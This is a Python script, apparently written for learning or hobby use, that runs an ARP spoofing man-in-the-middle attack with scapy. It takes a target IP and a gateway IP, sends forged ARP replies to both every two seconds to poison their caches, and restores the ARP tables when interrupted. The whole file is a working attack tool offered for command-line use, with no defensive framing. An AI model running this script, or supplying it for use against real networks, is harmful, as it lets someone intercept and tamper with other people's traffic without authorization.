#!/usr/bin/env python3

import scapy.all as scapy
import time
import argparse
# import sys

def get_terminal_cmd():
   parser = argparse.ArgumentParser(
      prog="arp_spoof",
      description="Man in the middle",
      epilog="Thank you for using %(prog)s :)"
   )
   parser.add_argument("-t", "--target", help="Ip address of target machine")
   parser.add_argument("-s", "--source", help="Ip address of router")
   args = parser.parse_args()
   return args

def get_mac1(ip) -> str:
   from scapy.layers.l2 import getmacbyip
   return getmacbyip(ip)

def get_mac(ip)-> str:
   arp_request = scapy.ARP(pdst = ip)
   broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
   arp_request_broadcast = broadcast/arp_request
   answered_list = scapy.srp(arp_request_broadcast, iface="eth0", timeout=1, verbose=False)[0]
   return answered_list[0][1].hwsrc
    

def spoof(target_ip, source_ip):
   target_mac = get_mac(target_ip)
   packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip) # Fooling the target
   scapy.send(packet, verbose=False)


def restore(des_ip, src_ip):
   des_mac = get_mac(des_ip)
   src_mac = get_mac(src_ip)
   packet = scapy.ARP(op=2, pdst=des_ip, hwdst=des_mac, psrc=src_ip, hwsrc=src_mac)
   scapy.send(packet, count=4, verbose=False)

args = get_terminal_cmd()
target_ip = args.target
gateway_ip = args.source

try:
   sent_packet_count = 0
   while True:
      spoof(target_ip, gateway_ip)
      spoof(gateway_ip, target_ip)
      sent_packet_count += 2
      # print(f'[+] Packets sent: {sent_packet_count}', end='\r', flush=True)
      print(f'[+] Packets sent: {sent_packet_count}', end="\r", flush=True)
      # print(f'\r [+] Packets sent: {sent_packet_count}'),
      # sys.stdout.flush()
      time.sleep(2)
except KeyboardInterrupt:
   print(f'\n CTRL+C detected ... Restoring ARP tables ... please wait ... Quitting')
   restore(target_ip, gateway_ip)
   restore(gateway_ip, target_ip)
   

#print(args.target)
#print(get_mac(args.target))